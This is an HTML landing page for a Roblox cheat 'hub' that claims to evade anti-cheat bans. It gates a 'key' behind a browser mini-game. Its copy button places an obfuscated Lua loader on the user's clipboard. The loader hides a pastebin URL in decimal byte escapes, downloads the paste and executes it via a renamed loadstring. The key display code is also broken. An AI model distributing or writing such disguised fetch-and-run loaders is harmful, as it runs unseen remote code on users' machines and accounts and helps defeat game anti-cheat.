<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Los hub</title>
<style>
body {margin: 0;font-family: Arial, sans-serif;background: radial-gradient(circle at top, #5a5aff, #2f2f5f);color: #fff;text-align: center;overflow-x: hidden;}
main {padding: 100px 20px 60px;position: relative;z-index: 2;}
h2 {font-size: 48px;margin-bottom: 15px;text-shadow: 0 0 10px rgba(255,255,255,0.5);}
p {font-size: 16px;max-width: 500px;margin: 0 auto 25px auto;}
.download-btn {display: inline-block;background: rgba(150,140,255,0.8);color: #fff;padding: 12px 25px;border-radius: 10px;font-size: 16px;text-decoration: none;font-weight: bold;transition: all 0.3s;box-shadow: 0 0 15px rgba(150,140,255,0.6);cursor: pointer;}
.download-btn:disabled {background: gray;cursor: not-allowed;box-shadow: none;}
.download-btn:hover:enabled {background: rgba(200,190,255,0.9);box-shadow: 0 0 25px rgba(200,190,255,0.8);transform: scale(1.05);}
.game-container {width: 100%;max-width: 500px;height: 300px;background: #222;margin: 30px auto;position: relative;overflow: hidden;border: 2px solid #fff;border-radius: 10px;}
#player {width: 30px;height: 30px;background: yellow;position: absolute;bottom: 0;left: 50px;}
.obstacle {width: 40px;background: red;position: absolute;}
#score {font-size: 18px;margin: 10px 0;}
#gameOverText {position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);font-size: 36px;color: red;display: none;text-shadow: 0 0 10px #fff;}
.preview {opacity: 0.5;}
</style>
</head>
<body>
<main>
<h2>Roblox Los hub</h2>
<p>This hub can be used even in towers with all-kill anti-cheat without getting banned!</p>
<button class="download-btn" onclick="copyScript()">Copy for script ⬇️</button>
<div class="how-to">
<h3>How To get key?</h3>
<p class="subtitle">You can get the key from Los Discord / KakaoTalk, or you can also get it from this site.</p>
<div class="game-container" id="game">
<div id="player"></div>
<div id="gameOverText">Game Over!</div>
</div>
<p id="score">Score: 0</p>
<div class="create-key">
<h3>Create Key</h3>
<input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
<button class="download-btn" id="createKeyBtn" onclick="createKey()" disabled>Generate Key</button>
<p id="generatedKey(score 300)"></p>
</div>
</div>
</main>
<script>
let score = 0;
const gravity = 0.6;
let velocity = 0;
let playerY = 0;
let obstacleSpeed = 5;

const player = document.getElementById("player");
const game = document.getElementById("game");
const scoreText = document.getElementById("score");
const createKeyBtn = document.getElementById("createKeyBtn");
const obstacles = [];
const gameOverText = document.getElementById("gameOverText");
let isGameOver = false;


let nextObstacle = {height: 0, bottom: 0, type: "bottom"};
let nextPreviewDiv = null;

function generateNextObstacle() {
  const h = Math.random() * 150 + 90; // 높이 3배
  const type = Math.random() < 0.5 ? "bottom" : "top";
  let bottom = 0;
  if (type === "bottom") bottom = 0;
  else bottom = game.offsetHeight - h;
  nextObstacle.height = h;
  nextObstacle.bottom = bottom;
  nextObstacle.type = type;

  if (nextPreviewDiv) nextPreviewDiv.remove();

  nextPreviewDiv = document.createElement("div");
  nextPreviewDiv.className = "obstacle preview";
  nextPreviewDiv.style.height = h + "px";
  nextPreviewDiv.style.bottom = bottom + "px";
  nextPreviewDiv.style.left = game.offsetWidth - 40 + "px";
  game.appendChild(nextPreviewDiv);
}

function jump() {
  if (!isGameOver) velocity = 10;
}

function updatePlayer() {
  velocity -= gravity;
  playerY += velocity;
  if (playerY < 0) playerY = 0;
  if (playerY > game.offsetHeight - player.offsetHeight) playerY = game.offsetHeight - player.offsetHeight;
  player.style.bottom = playerY + "px";
}

function createObstacleFromNext() {
  if (isGameOver) return;

  const obs = document.createElement("div");
  obs.className = "obstacle";
  obs.style.height = nextObstacle.height + "px";
  obs.style.bottom = nextObstacle.bottom + "px";
  obs.style.left = game.offsetWidth + "px";
  game.appendChild(obs);
  obstacles.push(obs);

  generateNextObstacle();
}

function updateObstacles() {
  for (let i = obstacles.length - 1; i >= 0; i--) {
    const obs = obstacles[i];
    obs.style.left = parseInt(obs.style.left) - obstacleSpeed + "px";
    if (parseInt(obs.style.left) < -50) {
      obs.remove();
      obstacles.splice(i, 1);
      score += 10;
      scoreText.innerText = "Score: " + score;
      if (score >= 300) createKeyBtn.disabled = false;
      if (score % 50 === 0) obstacleSpeed += 1;
    }
    const pRect = player.getBoundingClientRect();
    const oRect = obs.getBoundingClientRect();
    if (!(pRect.right < oRect.left || pRect.left > oRect.right || pRect.bottom < oRect.top || pRect.top > oRect.bottom)) {
      endGame();
    }
  }
  if (nextPreviewDiv) {
    nextPreviewDiv.style.left = parseInt(nextPreviewDiv.style.left) - obstacleSpeed + "px";
  }
}

function endGame() {
  if (isGameOver) return;
  isGameOver = true;
  gameOverText.style.display = "block";
  setTimeout(() => location.reload(), 3000);
}

function gameLoop() {
  if (!isGameOver) updatePlayer();
  updateObstacles();
  requestAnimationFrame(gameLoop);
}

game.addEventListener("click", jump);
generateNextObstacle();
setInterval(createObstacleFromNext, 1500);
gameLoop();


function copyScript() {
  const s = `local x={HDD=loadstring,GHD=function(u)return game:HttpGet(u)end}
local z="\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\98\\105\\110\\46\\99\\111\\109\\47\\114\\97\\119\\47\\116\\86\\82\\70\\77\\112\\76\\87"
local function w(s)local t={}for i=1,#s do t[#t+1]=string.char(s:byte(i))end return table.concat(t)end
local c=x.GHD(w(z))
x["HDD"](c)()`;
  const ta = document.createElement("textarea");
  ta.value = s;
  document.body.appendChild(ta);
  ta.select();
  document.execCommand("copy");
  document.body.removeChild(ta);
  alert("Script copied to clipboard!");
}

function createKey() {
  const username = document.getElementById("username").value.trim();
  if (!username) { alert("Please enter your username."); return; }
  const nameLength = username.length;
  const digits = username.match(/\d/g) || [];
  const digitSum = digits.reduce((sum, d) => sum + parseInt(d), 0);
  const keyBase = nameLength + digitSum;
  const secondChar = username[1] || "";
  const finalKey = secondChar + keyBase;
  document.getElementById("generatedKey").innerText = "Your Key: " + finalKey;
}
</script>
</body>
</html>
